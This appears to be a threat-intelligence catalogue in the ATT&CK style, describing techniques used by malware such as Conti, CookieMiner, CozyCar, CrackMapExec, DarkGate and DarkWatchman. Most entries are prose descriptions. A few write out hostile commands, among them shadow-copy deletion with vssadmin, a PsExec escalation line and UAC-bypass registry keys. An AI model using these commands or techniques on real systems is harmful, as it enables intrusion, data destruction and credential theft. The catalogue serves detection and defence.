Conti can use &lt;code&gt;CreateIoCompletionPort()&lt;/code&gt;, &lt;code&gt;PostQueuedCompletionStatus()&lt;/code&gt;, and &lt;code&gt;GetQueuedCompletionPort()&lt;/code&gt; to rapidly encrypt files, excluding those with the extensions of .exe, .dll, and .lnk. It has used a different AES-256 encryption key per file with a bundled RAS-4096 public encryption key that is unique for each victim. Conti can use “Windows Restart Manager” to ensure files are unlocked and open for encryption.
Conti has decrypted its payload using a hardcoded AES-256 key.
Conti has loaded an encrypted DLL into memory and then executes it.
Conti can discover files on a local system.
Conti can delete Windows Volume Shadow Copies using &lt;code&gt;vssadmin&lt;/code&gt;.
Conti has used API calls during execution.
Conti can enumerate remote open SMB network shares using &lt;code&gt;NetShareEnum()&lt;/code&gt;.
Conti can use compiler-based obfuscation for its code, encrypt DLLs, and hide Windows API calls.
Conti can enumerate through all open processes to search for any that have the string “sql” in their process name.
Conti has the ability to discover hosts on a target network.
Conti can spread via SMB and encrypts files on different hosts, potentially compromising an entire network.
Conti can stop up to 146 Windows services related to security, backup, database, and email solutions through the use of &lt;code&gt;net stop&lt;/code&gt;.
Conti can retrieve the ARP cache from the local system by using the &lt;code&gt;GetIpNetTable()&lt;/code&gt; API call and check to ensure IP addresses it connects to are for local, non-Internet, systems.
Conti can enumerate routine network connections from a compromised host.
Conti can spread itself by infecting other remote machines via network shared drives.
Conti can utilize command line options to allow an attacker control over how it scans and encrypts files.
CookieMiner has used base64 encoding to obfuscate scripts on the system.
CookieMiner can steal saved usernames and passwords in Chrome as well as credit card credentials.
CookieMiner has retrieved iPhone text messages from iTunes phone backup files.
CookieMiner has used Google Chrome's decryption and extraction operations.
CookieMiner has checked for the presence of "Little Snitch", macOS network monitoring and application firewall software, stopping and exiting if it is found.
CookieMiner has used the &lt;code&gt;curl --upload-file&lt;/code&gt; command to exfiltrate data over HTTP.
CookieMiner has looked for files in the user's home directory with "wallet" in their name using &lt;code&gt;find&lt;/code&gt;.
CookieMiner can download additional scripts from a web server.
CookieMiner has installed multiple new Launch Agents in order to maintain persistence for cryptocurrency mining software.
CookieMiner has used python scripts on the user’s system, as well as the Python variant of the Empire agent, EmPyre.
CookieMiner has loaded coinmining software onto systems to mine for Koto cryptocurrency.
CookieMiner has checked for the presence of "Little Snitch", macOS network monitoring and application firewall software, stopping and exiting if it is found.
CookieMiner can steal Google Chrome and Apple Safari browser cookies from the victim’s machine.
CookieMiner has used a Unix shell script to run a series of commands targeting macOS.
CosmicDuke exfiltrates collected files automatically over FTP to remote servers.
CosmicDuke copies and exfiltrates the clipboard contents every 30 seconds.
CosmicDuke collects user credentials, including passwords, for various programs including popular instant messaging applications and email clients as well as WLAN keys.
CosmicDuke collects user credentials, including passwords, for various programs including Web browsers.
CosmicDuke steals user files from local hard drives with file extensions that match a predefined list.
CosmicDuke steals user files from network shared drives with file extensions and keywords that match a predefined list.
CosmicDuke steals user files from removable media with file extensions and keywords that match a predefined list.
CosmicDuke exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.
CosmicDuke attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.
CosmicDuke searches attached and mounted drives for file extensions and keywords that match a predefined list.
CosmicDuke uses a keylogger.
CosmicDuke collects LSA secrets.
CosmicDuke searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.
CosmicDuke uses scheduled tasks typically named "Watchmon Service" for persistence.
CosmicDuke takes periodic screenshots and exfiltrates them.
CosmicDuke collects Windows account hashes.
CosmicDuke contains a custom version of the RC4 algorithm that includes a programming error.
CosmicDuke can use HTTP or HTTPS for command and control to hard-coded C2 servers.
CosmicDuke uses Windows services typically named "javamtsup" for persistence.
CostaBricks has added the entire unobfuscated code of the legitimate open source application Blink to its code.
CostaBricks has the ability to use bytecode to decrypt embedded payloads.
CostaBricks has been used to load SombRAT onto a compromised host.
CostaBricks has used a number of API calls, including `VirtualAlloc`, `VirtualFree`, `LoadLibraryA`, `GetProcAddress`, and `ExitProcess`.
CostaBricks can inject a payload into the memory of a compromised host.
CostaBricks can implement a custom-built virtual machine mechanism to obfuscate its code.
CozyCar uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.
The payload of CozyCar is encrypted with simple XOR with a rotating key. The CozyCar configuration file has been encrypted with RC4 keys.
CozyCar has executed Mimikatz to harvest stored credentials from the victim and further victim penetration.
One persistence mechanism used by CozyCar is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: &lt;br&gt;&lt;code&gt;HKLM\Software\Microsoft\Windows\CurrentVersion\Run\&lt;/code&gt; &lt;br&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\&lt;/code&gt; &lt;br&gt;&lt;code&gt;HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt; &lt;br&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;
The CozyCar dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.
The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component.
One persistence mechanism used by CozyCar is to register itself as a scheduled task.
Password stealer and NTLM stealer modules in CozyCar harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication.
The main CozyCar dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit.
A system info module in CozyCar gathers information on the victim host’s configuration.
Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.
CozyCar's main method of communicating with its C2 servers is using HTTP or HTTPS.
A module in CozyCar allows arbitrary commands to be executed by invoking &lt;code&gt;C:\Windows\System32\cmd.exe&lt;/code&gt;.
One persistence mechanism used by CozyCar is to register itself as a Windows service.
CrackMapExec can set a scheduled task on the target system to execute commands remotely using at.
CrackMapExec can brute force supplied user credentials across a network range.
CrackMapExec can enumerate the domain user accounts on a targeted system.
CrackMapExec can gather the user accounts within domain groups.
CrackMapExec can discover specified filetypes and log files on a targeted system.
CrackMapExec can dump hashed passwords from LSA secrets for the targeted system.
CrackMapExec can create a registry key using wdigest.
CrackMapExec can dump hashed passwords associated with Active Directory using Windows' Directory Replication Services API (DRSUAPI), or Volume Shadow Copy.
CrackMapExec can enumerate the shared folders and associated permissions for a targeted network.
CrackMapExec can pass the hash to authenticate via SMB.
CrackMapExec can brute force passwords for a specified user on a single target system or across an entire network.
CrackMapExec can discover the password policies applied to the target system.
CrackMapExec can brute force credential authentication by using a supplied list of usernames and a single password.
CrackMapExec can execute PowerShell commands via WMI.
CrackMapExec can discover active IP addresses, along with the machine name, within a targeted network.
CrackMapExec can dump usernames and hashed passwords from the SAM.
CrackMapExec can enumerate the system drives and associated system name.
CrackMapExec can collect DNS information from the targeted system.
CrackMapExec can discover active sessions for a targeted system.
CrackMapExec can execute remote commands using Windows Management Instrumentation.
CreepyDrive can use legitimate OAuth refresh tokens to authenticate with OneDrive.
CreepyDrive can use OneDrive for C2.
CreepyDrive can upload files to C2 from victim machines.
CreepyDrive can use cloud services including OneDrive for data exfiltration.
CreepyDrive can specify the local file path to upload files from.
CreepyDrive can download files to the compromised host.
CreepyDrive can use Powershell for execution, including the cmdlets `Invoke-WebRequest` and `Invoke-Expression`.
CreepyDrive can use HTTPS for C2 using the Microsoft Graph API.
CreepySnail can use stolen credentials to authenticate on target networks.
CreepySnail can connect to C2 for data exfiltration.
CreepySnail can use PowerShell for execution, including the cmdlets `Invoke-WebRequst` and `Invoke-Expression`.
CreepySnail can use Base64 to encode its C2 traffic.
CreepySnail can use `getmac` and `Get-NetIPAddress` to enumerate network settings.
CreepySnail can execute `getUsername` on compromised systems.
CreepySnail can use HTTP for C2.
Crimson can perform audio surveillance using microphones.
Crimson contains a module to steal credentials from Web browsers on the victim machine.
Crimson can collect information from a compromised host.
Crimson contains a module to collect data from removable drives.
Crimson can decode its encoded PE file prior to execution.
Crimson can exfiltrate stolen information over its C2.
Crimson has the ability to delete files from a compromised host.
Crimson contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.
Crimson contains a command to retrieve files from its C2 server.
Crimson can use a module to perform keylogging on compromised hosts.
Crimson contains a command to collect and exfiltrate emails from Outlook.
Crimson can set a Registry key to determine how long it has been installed and possibly to indicate the version number.
Crimson uses a custom TCP protocol for C2.
Crimson has the ability to discover pluggable/removable drives to extract files from.
Crimson contains a command to list processes.
Crimson can check the Registry for the presence of &lt;code&gt;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last_edate&lt;/code&gt; to determine how long it has been installed on a host.
Crimson can add Registry run keys for persistence.
Crimson can spread across systems by infecting removable media.
Crimson contains a command to perform screen captures.
Crimson contains a command to collect information about anti-virus software on the victim.
Crimson contains a command to collect the victim PC name, disk drive information, and operating system.
Crimson can identify the geographical location of a victim host.
Crimson contains a command to collect the victim MAC address and LAN IP.
Crimson can identify the user on a targeted system.
Crimson has the ability to determine the date and time on a compromised host.
Crimson can determine when it has been installed on a host for at least 15 days before downloading the final payload.
Crimson can capture webcam video on targeted systems.
Crimson can use a HTTP GET request to download its final payload.
Crimson has the ability to execute commands with the COMSPEC environment variable.
CrossRAT can list all files on a system.
CrossRAT creates a Launch Agent on macOS.
CrossRAT uses run keys for persistence on Windows.
CrossRAT is capable of taking screen captures.
CrossRAT can use an XDG Autostart to establish persistence.
Crutch has used the WinRAR utility to compress and encrypt stolen files.
Crutch can automatically monitor removable drives in a loop and copy interesting files.
Crutch has automatically exfiltrated stolen files to Dropbox.
Crutch can use Dropbox to receive commands and upload stolen data.
Crutch can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive.
Crutch can exfiltrate files from compromised systems.
Crutch can monitor removable drives and exfiltrate files matching a given extension list.
Crutch can exfiltrate data over the primary C2 channel (Dropbox HTTP API).
Crutch has exfiltrated stolen data to Dropbox.
Crutch has used a hardcoded GitHub repository as a fallback channel.
Crutch has staged stolen files in the &lt;code&gt;C:\AMD\Temp&lt;/code&gt; directory.
Crutch has established persistence with a scheduled task impersonating the Outlook item finder.
Crutch can monitor for removable drives being plugged into the compromised machine.
Crutch has the ability to persist using scheduled tasks.
Crutch has conducted C2 communications with a Dropbox account using the HTTP API.
Cryptoistic can retrieve files from the local file system.
Cryptoistic can engage in encrypted communications with C2.
Cryptoistic has the ability delete files from a compromised host.
Cryptoistic can scan a directory to identify files for deletion.
Cryptoistic has the ability to send and receive files.
Cryptoistic can use TCP in communications with C2.
Cryptoistic can gather data on the user of a compromised host.
Cuba has used &lt;code&gt;SeDebugPrivilege&lt;/code&gt; and &lt;code&gt;AdjustTokenPrivileges&lt;/code&gt; to elevate privileges.
Cuba has the ability to encrypt system data and add the ".cuba" extension to encrypted files.
Cuba can use the command &lt;code&gt;cmd.exe /c del&lt;/code&gt; to delete its artifacts from the system.
Cuba can enumerate files by using a variety of functions.
Cuba has executed hidden PowerShell windows.
Cuba can download files from its C2 server.
Cuba logs keystrokes via polling by using &lt;code&gt;GetKeyState&lt;/code&gt; and &lt;code&gt;VkKeyScan&lt;/code&gt; functions.
Cuba has been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs.
Cuba has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum.
Cuba can discover shared resources using the &lt;code&gt;NetShareEnum&lt;/code&gt; API call.
Cuba has used multiple layers of obfuscation to avoid analysis, including its Base64 encoded payload.
Cuba has been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts.
Cuba can enumerate processes running on a victim's machine.
Cuba loaded the payload into memory using PowerShell.
Cuba has a hardcoded list of services and processes to terminate.
Cuba has a packed payload when delivered.
Cuba can enumerate local drives, disk type, and disk free space.
Cuba can check if Russian language is installed on the infected machine by using the function &lt;code&gt;GetKeyboardLayoutList&lt;/code&gt;.
Cuba can retrieve the ARP cache from the local system by using &lt;code&gt;GetIpNetTable&lt;/code&gt;.
Cuba can use the function &lt;code&gt;GetIpNetTable&lt;/code&gt; to recover the last connections to the victim's machine.
Cuba can query service status using &lt;code&gt;QueryServiceStatusEx&lt;/code&gt; function.
Cuba has used &lt;code&gt;cmd.exe /c&lt;/code&gt; and batch files for execution.
Cuba can modify services by using the &lt;code&gt;OpenService&lt;/code&gt; and &lt;code&gt;ChangeServiceConfig&lt;/code&gt; functions.
Cyclops Blink can encrypt C2 messages with AES-256-CBC sent underneath TLS. OpenSSL library functions are also used to encrypt each message using a randomly generated key and IV, which are then encrypted using a hard-coded RSA public key.
Cyclops Blink has maintained persistence by patching legitimate device firmware when it is downloaded, including that of WatchGuard devices.
Cyclops Blink can upload files from a compromised host.
Cyclops Blink can decrypt and parse instructions sent from C2.
Cyclops Blink can modify the Linux iptables firewall to enable C2 communication on network devices via a stored list of port numbers.
Cyclops Blink has the ability to upload exfiltrated files to a C2 server.
Cyclops Blink can use the Linux API `statvfs` to enumerate the current working directory.
Cyclops Blink has the ability to download files to target systems.
Cyclops Blink has the ability to create a pipe to enable inter-process communication.
Cyclops Blink can rename its running process to &lt;code&gt;[kworker:0/1]&lt;/code&gt; to masquerade as a Linux kernel thread. Cyclops Blink has also named RC scripts used for persistence after WatchGuard artifacts.
Cyclops Blink has used Tor nodes for C2 traffic.
Cyclops Blink can use various Linux API functions including those for execution and discovery.
Cyclops Blink can use a custom binary scheme to encode messages with specific commands and parameters to be executed.
Cyclops Blink can use non-standard ports for C2 not typically associated with HTTP or HTTPS traffic.
Cyclops Blink can enumerate the process it is currently running under.
Cyclops Blink can use DNS over HTTPS (DoH) to resolve C2 nodes.
Cyclops Blink has the ability to execute on device startup, using a modified RC script named S51armled.
Cyclops Blink has the ability to query device information.
Cyclops Blink can use the Linux API `if_nameindex` to gather network interface names.
Cyclops Blink has the ability to use the Linux API function `utime` to change the timestamps of modified firmware update images.
Cyclops Blink can download files via HTTP and HTTPS.
DCSrv has encrypted drives using the core encryption mechanism from DiskCryptor.
DCSrv's configuration is encrypted.
DCSrv has masqueraded its service as a legitimate svchost.exe process.
DCSrv has created Registry keys for persistence.
DCSrv has used various Windows API functions, including `DeviceIoControl`, as part of its encryption process.
DCSrv has a function to sleep for two hours before rebooting the system.
DCSrv can compare the current time on an infected host with a configuration value to determine when to start the encryption process.
DCSrv has created new services for persistence by modifying the Registry.
DDKONG decodes an embedded configuration using XOR.
DDKONG lists files on the victim’s machine.
DDKONG downloads and uploads files on the victim’s machine.
DDKONG uses Rundll32 to ensure only a single instance of itself is running at once.
DEADEYE has the ability to combine multiple sections of a binary which were broken up to evade detection into a single .dll prior to execution.
The DEADEYE.EMBED variant of DEADEYE has the ability to embed payloads inside of a compiled binary.
DEADEYE has encrypted its payload.
DEADEYE can ensure it executes only on intended systems by identifying the victim's volume serial number, hostname, and/or DNS domain.
DEADEYE has used `schtasks /change` to modify scheduled tasks including `\Microsoft\Windows\PLA\Server Manager Performance Monitor`, `\Microsoft\Windows\Ras\ManagerMobility, \Microsoft\Windows\WDI\SrvSetupResults`, and `\Microsoft\Windows\WDI\USOShared`.
DEADEYE can use `msiexec.exe` for execution of malicious DLL.
The DEADEYE.EMBED variant of DEADEYE can embed its payload in an alternate data stream of a local file.
DEADEYE can execute the `GetComputerNameA` and `GetComputerNameExA` WinAPI functions.
DEADEYE can use `rundll32.exe` for execution of living off the land binaries (lolbin) such as `SHELL32.DLL`.
DEADEYE has used the scheduled tasks `\Microsoft\Windows\PLA\Server Manager Performance Monitor`, `\Microsoft\Windows\Ras\ManagerMobility`, `\Microsoft\Windows\WDI\SrvSetupResults`, and `\Microsoft\Windows\WDI\USOShared`
 to establish persistence.
DEADEYE can enumerate a victim computer's volume serial number and host name.
DEADEYE can discover the DNS domain name of a targeted system.
DEADEYE can run `cmd /c copy /y /b C:\Users\public\syslog_6-*.dat C:\Users\public\syslog.dll` to combine separated sections of code into a single DLL prior to execution.
DEATHRANSOM can use public and private key pair encryption to encrypt files for ransom payment.
DEATHRANSOM can use loop operations to enumerate directories on a compromised host.
DEATHRANSOM can download files to a compromised host.
DEATHRANSOM can delete volume shadow copies on compromised hosts.
DEATHRANSOM has the ability to use loop operations to enumerate network resources.
DEATHRANSOM can enumerate logical drives on a target system.
Some versions of DEATHRANSOM have performed language ID and keyboard layout checks; if either of these matched Russian, Kazakh, Belarusian, Ukrainian or Tatar DEATHRANSOM would exit.
DEATHRANSOM can use HTTPS to download files.
DEATHRANSOM has the ability to use WMI to delete volume shadow copies.
DOGCALL can capture microphone data from the victim's machine.
DOGCALL is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.
DOGCALL is encrypted using single-byte XOR.
DOGCALL can download and execute additional payloads.
DOGCALL is capable of logging keystrokes.
DOGCALL is capable of capturing screenshots of the victim's machine.
DRATzarus can collect information from a compromised host.
DRATzarus can use `IsDebuggerPresent` to detect whether a debugger is present on a victim.
DRATzarus can deploy additional tools onto an infected machine.
DRATzarus has been named `Flash.exe`, and its dropper has been named `IExplorer`.
DRATzarus can use various API calls to see if it is running in a sandbox.
DRATzarus can be partly encrypted with XOR.
DRATzarus can enumerate and examine running processes to determine if a debugger is present.
DRATzarus can search for other machines connected to compromised host and attempt to map the network.
DRATzarus's dropper can be packed with UPX.
DRATzarus can obtain a list of users from an infected machine.
DRATzarus can use the `GetTickCount` and `GetSystemTimeAsFileTime` API calls to inspect system time.
DRATzarus can use the `GetTickCount` and `GetSystemTimeAsFileTime` API calls to measure function timing. DRATzarus can also remotely shut down into sleep mode under specific conditions to evade 
detection.
DRATzarus can use HTTP or HTTPS for C2 communications.
Dacls can encrypt its configuration file with AES CBC.
Dacls can scan directories on a compromised host.
Dacls has had its payload named with a dot prefix to make it hidden from view in the Finder application.
Dacls can download its payload from a C2 server.
Dacls can establish persistence via a LaunchAgent.
Dacls can establish persistence via a Launch Daemon.
The Dacls Mach-O binary has been disguised as a .nib file.
Dacls can collect data on running and parent processes.
Dacls can use HTTPS in C2 communications.
DanBot can use use IPv4 A records and IPv6 AAAA DNS records in C2 communications.
DanBot can upload files from compromised hosts.
DanBot can use a VBA macro to decode its payload prior to installation and execution.
DanBot can Base64 encode its payload.
DanBot can delete its configuration file after installation.
DanBot can download additional files to a targeted system.
DanBot has relied on victims' opening a malicious file for initial execution.
DanBot files have been named `UltraVNC.exe` and `WINVNC.exe` to appear as legitimate VNC tools.
DanBot can use a scheduled task for installation.
DanBot has been distributed within a malicious Excel attachment via spearphishing emails.
DanBot can use VNC for remote access to targeted systems.
DanBot can use a VBA macro embedded in an Excel file to drop the payload.
DanBot can use HTTP in C2 communication.
DanBot has the ability to execute arbitrary commands via `cmd.exe`.
DarkComet can listen in to victims' conversations through the system’s microphone.
DarkComet can steal data from the clipboard.
DarkComet can execute various types of scripts on the victim’s machine.
DarkComet can disable Security Center functions like the Windows Firewall.
DarkComet can disable Security Center functions like anti-virus.
DarkComet can load any files onto the infected machine to execute.
DarkComet has a keylogging capability.
DarkComet has dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file.
DarkComet adds a Registry value for its installation routine to the Registry Key &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=”0”&lt;/code&gt; and &lt;code&gt;HKEY_CURRENT_USER\Software\DC3_FEXEC&lt;/code&gt;.
DarkComet can list active processes running on the victim’s machine.
DarkComet adds several Registry entries to enable automatic execution at every system startup.
DarkComet can open an active screen of the victim’s machine and take control of the mouse and keyboard.
DarkComet has the option to compress its payload using UPX or MPRESS.
DarkComet can collect the computer name, RAM used, and operating system version from the victim’s machine.
DarkComet gathers the username from the victim’s machine.
DarkComet can access the victim’s webcam to take pictures.
DarkComet can use HTTP for C2 communications.
DarkComet can launch a remote shell to execute commands on the victim’s machine.
DarkGate elevates accounts created through the malware to the local administration group during execution.
DarkGate will search for cryptocurrency wallets by examining application window names for specific strings. DarkGate extracts information collected via NirSoft tools from the hosting process's memory by first identifying the window through the &lt;code&gt;FindWindow&lt;/code&gt; API function.
DarkGate uses AutoIt scripts dropped to a hidden directory during initial installation phases, such as `test.au3`.
DarkGate searches for stored credentials associated with cryptocurrency wallets and notifies the command and control server when identified.
DarkGate uses two distinct User Account Control (UAC) bypass techniques to escalate privileges.
DarkGate starts a thread on execution that captures clipboard data and logs it to a predefined log file.
DarkGate use Nirsoft Network Password Recovery or NetPass tools to steal stored RDP credentials in some malware versions.
DarkGate includes one infection vector that leverages a malicious "KeyScramblerE.DLL" library that will load during the execution of the legitimate KeyScrambler application.
DarkGate can cloak command and control traffic in DNS records from legitimate services to avoid reputation-based detection techniques.
DarkGate can deploy follow-on ransomware payloads.
DarkGate will retrieved encrypted commands from its command and control server for follow-on actions such as cryptocurrency mining.
DarkGate checks the &lt;code&gt;BeingDebugged&lt;/code&gt; flag in the PEB structure during execution to identify if the malware is being debugged.
DarkGate installation includes binary code stored in a file located in a hidden directory, such as &lt;code&gt;shell.txt&lt;/code&gt;, that is decrypted then executed. DarkGate uses hexadecimal-encoded shellcode payloads during installation that are called via Windows API &lt;code&gt;CallWindowProc()&lt;/code&gt; to decode and then execute.
DarkGate will terminate processes associated with several security software products if identified during execution.
DarkGate command and control includes hard-coded domains in the malware chosen to masquerade as legitimate services such as Akamai CDN or Amazon Web Services.
DarkGate masquerades malicious LNK files as PDF objects using the double extension &lt;code&gt;.pdf.lnk&lt;/code&gt;.
DarkGate drops an encrypted PE file, pe.bin, and decrypts it during installation. DarkGate also uses custom base64 encoding schemas in later variations to obfuscate payloads.
DarkGate uses per-victim links for hosting malicious archives, such as ZIP files, in services such as SharePoint to prevent other entities from retrieving them.
DarkGate uses existing command and control channels to retrieve captured cryptocurrency wallet credentials.
Some versions of DarkGate search for the hard-coded folder &lt;code&gt;C:\Program Files\e Carte Bleue&lt;/code&gt;.
DarkGate can deploy payloads capable of capturing credentials related to cryptocurrency wallets.
DarkGate initial installation involves dropping several files to a hidden directory named after the victim machine name.
DarkGate command and control includes hard-coded domains in the malware masquerading as legitimate services such as Akamai CDN or Amazon Web Services.
DarkGate edits the Registry key &lt;code&gt;HKCU\Software\Classes\mscfile\shell\open\command&lt;/code&gt; to execute a malicious AutoIt script. When eventvwr.exe is executed, this will call the Microsoft Management Console (mmc.exe), which in turn references the modified Registry key.
DarkGate retrieves cryptocurrency mining payloads and commands in encrypted traffic from its command and control server. DarkGate uses Windows Batch scripts executing the &lt;code&gt;curl&lt;/code&gt; command to retrieve follow-on payloads.
DarkGate can delete system restore points through the command &lt;code&gt;cmd.exe /c vssadmin delete shadows /for=c: /all /quiet”&lt;/code&gt;.
DarkGate will spawn a thread on execution to capture all keyboard events and write them to a predefined log file.
DarkGate creates a local user account, &lt;code&gt;SafeMode&lt;/code&gt;, via &lt;code&gt;net user&lt;/code&gt; commands.
DarkGate initial infection payloads can masquerade as pirated media content requiring user interaction for code execution. DarkGate is distributed through phishing links to VBS or MSI objects requiring user interaction for execution.
DarkGate can masquerade as pirated media content for initial delivery to victims.
DarkGate uses the native Windows API &lt;code&gt;CallWindowProc()&lt;/code&gt; to decode and launch encoded shellcode payloads during execution. DarkGate can call kernel mode functions directly to hide the use of process hollowing methods during execution.
DarkGate uses a hard-coded string as a seed, along with the victim machine hardware identifier and input text, to generate a unique string used as an internal mutex value to evade static detection based on mutexes.
DarkGate relies on parent PID spoofing as part of its "rootkit-like" functionality to evade detection via Task Manager or Process Explorer.
DarkGate overrides the &lt;code&gt;%windir%&lt;/code&gt; environment variable by setting a Registry key, &lt;code&gt;HKEY_CURRENT_User\Environment\windir&lt;/code&gt;, to an alternate command to execute a malicious AutoIt script. This allows DarkGate to run every time the scheduled task &lt;code&gt;DiskCleanup&lt;/code&gt; is executed as this uses the path value &lt;code&gt;%windir%\system32\cleanmgr.exe&lt;/code&gt; for execution.
DarkGate performs various checks for running processes, including security software by looking for hard-coded process name values.
DarkGate leverages process hollowing techniques to evade detection, such as decrypting the content of an encrypted PE file and injecting it into the process vbc.exe.
DarkGate installation includes AutoIt script execution creating a shortcut to itself as an LNK object, such as bill.lnk, in the victim startup folder. DarkGate installation finishes with the creation of a registry Run key.
DarkGate executes a Windows Batch script during installation that creases a randomly-named directory in the &lt;code&gt;C:\\&lt;/code&gt; root directory that copies and renames the legitimate Windows &lt;curl&gt;curl&lt;/code&gt; command to this new location.
DarkGate can deploy follow-on cryptocurrency mining payloads.
DarkGate looks for various security products by process name using hard-coded values in the malware. DarkGate will not execute its keylogging thread if a process name associated with Trend Micro anti-virus is identified, or if runtime checks identify the presence of Kaspersky anti-virus. DarkGate will initiate a new thread if certain security products are identified on the victim, and recreate any malicious files associated with it if it determines they were removed by security software in a new system location.
DarkGate tries to elevate privileges to &lt;code&gt;SYSTEM&lt;/code&gt; using PsExec to locally execute as a service, such as &lt;code&gt;cmd /c c:\temp\PsExec.exe -accepteula -j -d -s [Target Binary]&lt;/code&gt;.
DarkGate can be distributed through emails with malicious attachments from a spoofed email address.
DarkGate is distributed in phishing emails containing links to distribute malicious VBS or MSI files. DarkGate uses applications such as Microsoft Teams for distributing links to payloads.
DarkGate queries system resources on an infected machine to identify if it is executing in a sandbox or virtualized environment.
DarkGate uses the Delphi methods &lt;code&gt;Sysutils::DiskSize&lt;/code&gt; and &lt;code&gt;GlobalMemoryStatusEx&lt;/code&gt; to collect disk size and physical memory as part of the malware's anti-analysis checks for running in a virtualized environment. DarkGate will gather various system information such as display adapter description, operating system type and version, processor type, and RAM amount.
DarkGate queries system locale information during execution. Later versions of DarkGate query &lt;code&gt;GetSystemDefaultLCID&lt;/code&gt; for locale information to determine if the malware is executing in Russian-speaking countries.
DarkGate creates a log file for capturing keylogging, clipboard, and related data using the victim host's current date for the filename. DarkGate queries victim system epoch time during execution. DarkGate captures system time information as part of automated profiling on initial installation.
DarkGate uses NirSoft tools to steal user credentials from the infected machine. NirSoft tools are executed via process hollowing in a newly-created instance of vbc.exe or regasm.exe.
DarkGate initial infection mechanisms include masquerading as pirated media that launches malicious VBScript on the victim.
DarkGate uses a malicious Windows Batch script to run the Windows &lt;code&gt;code&lt;/code&gt; utility to retrieve follow-on script payloads.
DarkTortilla can detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active.
DarkTortilla can download a clipboard information stealer module.
DarkTortilla has used the `WshShortcut` COM object to create a .lnk shortcut file in the Windows startup folder.
DarkTortilla can detect debuggers by using functions such as `DebuggerIsAttached` and `DebuggerIsLogging`. DarkTortilla can also detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active.
DarkTortilla can decrypt its payload and associated configuration elements using the Rijndael cipher.
DarkTortilla can use a .NET-based DLL named `RunPe6` for process injection.
DarkTortilla has used `%HiddenReg%` and `%HiddenKey%` as part of its persistence via the Windows registry.
DarkTortilla can download additional packages for keylogging, cryptocurrency mining, and other capabilities; it can also retrieve malicious payloads such as Agent Tesla, AsyncRat, NanoCore, RedLine, Cobalt Strike, and Metasploit.
DarkTortilla can check for internet connectivity by issuing HTTP GET requests.
DarkTortilla can download a keylogging module.
DarkTortilla has relied on a user to open a malicious document or archived file delivered via email for initial execution.
DarkTortilla's payload has been renamed `PowerShellInfo.exe`.
DarkTortilla has modified registry keys for persistence.
DarkTortilla can use a variety of API calls for persistence and defense evasion.
DarkTortilla has been obfuscated with the DeepSea .NET and ConfuserEx code obfuscators.
DarkTortilla can enumerate a list of running processes on a compromised system.
DarkTortilla has established persistence via the `Software\Microsoft\Windows NT\CurrentVersion\Run` registry key and by creating a .lnk shortcut file in the Windows startup folder.
DarkTortilla can check for the Kaspersky Anti-Virus suite.
DarkTortilla has been distributed via spearphishing emails containing archive attachments, with file types such as .iso, .zip, .img, .dmg, and .tar, as well as through malicious documents.
DarkTortilla can search a compromised system's running processes and services to detect Hyper-V, QEMU, Virtual PC, Virtual Box, and VMware, as well as Sandboxie.
DarkTortilla can obtain system information by querying the `Win32_ComputerSystem`, `Win32_BIOS`, `Win32_MotherboardDevice`, `Win32_PnPEntity`, and `Win32_DiskDrive` WMI objects.
DarkTortilla can retrieve information about a compromised system's running services.
DarkTortilla can implement the `kernel32.dll` Sleep function to delay execution for up to 300 seconds before implementing persistence or processing an addon package.
DarkTortilla has used HTTP and HTTPS for C2.
DarkTortilla can retrieve its primary payload from public sites such as Pastebin and Textbin.
DarkTortilla can use `cmd.exe` to add registry keys for persistence.
DarkTortilla can use WMI queries to obtain system information.
DarkTortilla has established persistence via the `Software\Microsoft\Windows NT\CurrentVersion\Winlogon` registry key.
DarkWatchman reports window names along with keylogger information to provide application context.
DarkWatchman can use TLS to encrypt its C2 channel.
DarkWatchman can retrieve browser history.
DarkWatchman has used Base64 to encode PowerShell commands.
DarkWatchman has used the &lt;code&gt;csc.exe&lt;/code&gt; tool to compile a C# executable.
DarkWatchman can collect files from a compromised host.
DarkWatchman has the ability to self-extract as a RAR archive.
DarkWatchman has used a DGA to generate a domain name for C2.
DarkWatchman has been delivered as compressed RAR payloads in ZIP files to victims.
DarkWatchman has been observed deleting its original launcher after installation.
DarkWatchman has the ability to enumerate file and folder names.
DarkWatchman can store configuration strings, keylogger, and output of components in the Registry.
DarkWatchman can uninstall malicious components from the Registry, stop processes, and clear the browser history.
DarkWatchman can delete shadow volumes using &lt;code&gt;vssadmin.exe&lt;/code&gt;.
DarkWatchman uses JavaScript to perform its core functionalities.
DarkWatchman can track key presses with a keylogger module.
DarkWatchman can stage local data in the Windows Registry.
DarkWatchman has used an icon mimicking a text file to mask a malicious executable.
DarkWatchman can modify Registry values to store configuration strings, keylogger, and output of components.
DarkWatchman can list signed PnP drivers for smartcard readers.
DarkWatchman can execute PowerShell commands and has used PowerShell to execute a keylogger.
